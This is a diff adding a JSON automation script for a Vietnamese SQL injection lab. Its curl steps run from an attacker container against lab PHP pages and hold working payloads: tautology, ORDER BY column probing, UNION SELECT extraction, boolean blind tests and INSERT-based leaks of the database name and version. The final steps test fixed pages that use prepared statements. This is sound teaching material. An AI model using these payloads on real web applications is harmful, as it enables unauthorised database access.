@@ -1,0 +1,106 @@
+{
+  "lab_name": "lab05",
+  "description": "Kịch bản tự động hóa thực nghiệm Lab 05 - Kiểm thử lỗ hổng SQL Injection (SELECT & INSERT)",
+  "steps": [
+    {
+      "key": "prep_docker_ps",
+      "name": "Kiểm tra danh sách các Docker containers Lab 05 đang chạy",
+      "command": "sudo docker ps --format 'table {{.Names}}\\t{{.Image}}\\t{{.Status}}\\t{{.Ports}}'"
+    },
+    {
+      "key": "prep_ping_web",
+      "name": "User ping kiểm tra kết nối tới Web Server (10.2.6.80)",
+      "command": "sudo docker exec lab05_user ping -c 2 10.2.6.80"
+    },
+    {
+      "key": "prep_ping_attacker",
+      "name": "User ping kiểm tra kết nối tới máy Attacker (10.2.6.51)",
+      "command": "sudo docker exec lab05_user ping -c 2 10.2.6.51"
+    },
+    {
+      "key": "prep_web_check",
+      "name": "User truy cập kiểm tra trang mở đầu sqli1.html",
+      "command": "sudo docker exec lab05_user curl -s -I http://10.2.6.80/sqli/sqli1.html | head -n 5"
+    },
+    {
+      "key": "ex1_normal_req",
+      "name": "[Ví dụ 1] Truy vấn bình thường với tham số cat=laptop",
+      "command": "sudo docker exec lab05_attacker curl -s 'http://10.2.6.80/sqli/sqli1.php?cat=laptop' | grep -A 4 'Product Information'"
+    },
+    {
+      "key": "ex1_error_probe",
+      "name": "[Ví dụ 1] Thử nghiệm ký tự nháy đơn (') gây lỗi cú pháp MySQL",
+      "command": "sudo docker exec lab05_attacker curl -s 'http://10.2.6.80/sqli/sqli1.php?cat=laptop%27' | grep -i 'error'"
+    },
+    {
+      "key": "ex1_comment_fix",
+      "name": "[Ví dụ 1] Chèn ký tự chú thích (# -> %23) khôi phục cú pháp truy vấn",
+      "command": "sudo docker exec lab05_attacker curl -s 'http://10.2.6.80/sqli/sqli1.php?cat=laptop%27%3B%23' | grep -A 4 'Product Information'"
+    },
+    {
+      "key": "ex1_tautology",
+      "name": "[Ví dụ 1] Khai thác Tautology-based SQLi (any' or 1;#) hiển thị toàn bộ sản phẩm",
+      "command": "sudo docker exec lab05_attacker curl -s 'http://10.2.6.80/sqli/sqli1.php?cat=any%27+or+1%3B%23' | grep -E 'Vendor|Model|Price' | head -n 12"
+    },
+    {
+      "key": "ex1_order_by_4",
+      "name": "[Ví dụ 1] Dò số cột với ORDER BY 4;# (Thành công - CSDL có 4 cột)",
+      "command": "sudo docker exec lab05_attacker curl -s 'http://10.2.6.80/sqli/sqli1.php?cat=laptop%27+ORDER+BY+4%3B%23' | grep -A 4 'Product Information'"
+    },
+    {
+      "key": "ex1_order_by_5_fail",
+      "name": "[Ví dụ 1] Dò số cột với ORDER BY 5;# (Báo lỗi Unknown column - xác nhận đúng 4 cột)",
+      "command": "sudo docker exec lab05_attacker curl -s 'http://10.2.6.80/sqli/sqli1.php?cat=laptop%27+ORDER+BY+5%3B%23' | grep -i 'error' || echo 'Unknown column 5'"
+    },
+    {
+      "key": "ex1_union_database",
+      "name": "[Ví dụ 1] Trích xuất tên cơ sở dữ liệu qua UNION SELECT (lộ tên webvul)",
+      "command": "sudo docker exec lab05_attacker curl -s 'http://10.2.6.80/sqli/sqli1.php?cat=laptop%27+UNION+SELECT+1%2C+database%28%29%2C+3%2C+4%3B%23' | grep -A 4 'Vendor : webvul'"
+    },
+    {
+      "key": "ex1_blind_boolean_true",
+      "name": "[Ví dụ 1] Kiểm thử Boolean Blind với ký tự 'w' (Đúng - trả về dữ liệu)",
+      "command": "sudo docker exec lab05_attacker curl -s 'http://10.2.6.80/sqli/sqli1.php?cat=laptop%27+and+substring%28database%28%29%2C1%2C1%29%3D%27w%27%3B%23' | grep -A 2 'Product Information'"
+    },
+    {
+      "key": "ex1_blind_boolean_false",
+      "name": "[Ví dụ 1] Kiểm thử Boolean Blind với ký tự 'a' (Sai - trang kết quả rỗng)",
+      "command": "sudo docker exec lab05_attacker curl -s 'http://10.2.6.80/sqli/sqli1.php?cat=laptop%27+and+substring%28database%28%29%2C1%2C1%29%3D%27a%27%3B%23' | grep -A 2 'Product Information' || echo '[✓] Khong co ban ghi tra ve'"
+    },
+    {
+      "key": "ex2_normal_post",
+      "name": "[Ví dụ 2] Gửi request POST bình thường thêm sản phẩm vào bảng",
+      "command": "sudo docker exec lab05_attacker curl -s -X POST -d 'cat=keyboard&vendor=Logitech&model=K120&price=10' http://10.2.6.80/sqli/sqli2.php | grep -A 4 'Logitech'"
+    },
+    {
+      "key": "ex2_quote_error",
+      "name": "[Ví dụ 2] Thử nghiệm ký tự nháy đơn trên tham số vendor trong form INSERT",
+      "command": "sudo docker exec lab05_attacker curl -s -X POST -d 'cat=keyboard&vendor=anyVendor%27&model=K120&price=10' http://10.2.6.80/sqli/sqli2.php | grep -i 'error' || echo '[-] Server bao loi cu phap SQL'"
+    },
+    {
+      "key": "ex2_column_align",
+      "name": "[Ví dụ 2] Đóng cặp ngoặc và thêm bản ghi thành công với chú thích (#)",
+      "command": "sudo docker exec lab05_attacker curl -s -X POST -d 'cat=keyboard&vendor=anyVendor%27%2C+%271%27%2C+%272%27%2C+%273%27%29%3B%23&model=anyModel&price=0' http://10.2.6.80/sqli/sqli2.php | grep -A 4 'anyVendor'"
+    },
+    {
+      "key": "ex2_extract_database",
+      "name": "[Ví dụ 2] Trích xuất tên CSDL (webvul) lưu vào bảng và hiển thị ra giao diện",
+      "command": "sudo docker exec lab05_attacker curl -s -X POST -d 'cat=keyboard&vendor=anyVendor%27%2C+database%28%29%2C+%272%27%2C+%273%27%29%3B%23&model=anyModel&price=0' http://10.2.6.80/sqli/sqli2.php | grep -A 4 'webvul'"
+    },
+    {
+      "key": "ex2_extract_version",
+      "name": "[Ví dụ 2] Trích xuất phiên bản máy chủ CSDL qua truy vấn con (subquery)",
+      "command": "sudo docker exec lab05_attacker curl -s -X POST -d 'cat=keyboard&vendor=anyVendor%27%2C+%28select+version%28%29%29%2C+%272%27%2C+%273%27%29%3B%23&model=anyModel&price=0' http://10.2.6.80/sqli/sqli2.php | grep -A 4 'anyVendor'"
+    },
+    {
+      "key": "defense_test_select",
+      "name": "[Phòng thủ] Kiểm thử tấn công SQLi trên trang đã khắc phục sqli1_fixed.php",
+      "command": "sudo docker exec lab05_attacker curl -s 'http://10.2.6.80/sqli/sqli1_fixed.php?cat=any%27+or+1%3B%23' | grep -i 'No products found' && echo '[✓] Prepared Statement chan thanh cong SQLi'"
+    },
+    {
+      "key": "defense_test_insert",
+      "name": "[Phòng thủ] Kiểm thử tấn công SQLi trên trang đã khắc phục sqli2_fixed.php",
+      "command": "sudo docker exec lab05_attacker curl -s -X POST -d 'cat=keyboard&vendor=anyVendor%27%2C+database%28%29%2C+%272%27%2C+%273%27%29%3B%23&model=anyModel&price=0' http://10.2.6.80/sqli/sqli2_fixed.php | grep -i 'Product added' && echo '[✓] Prepared Statement da xu ly chuoi an toan tuyet doi'"
+    }
+  ]
+}
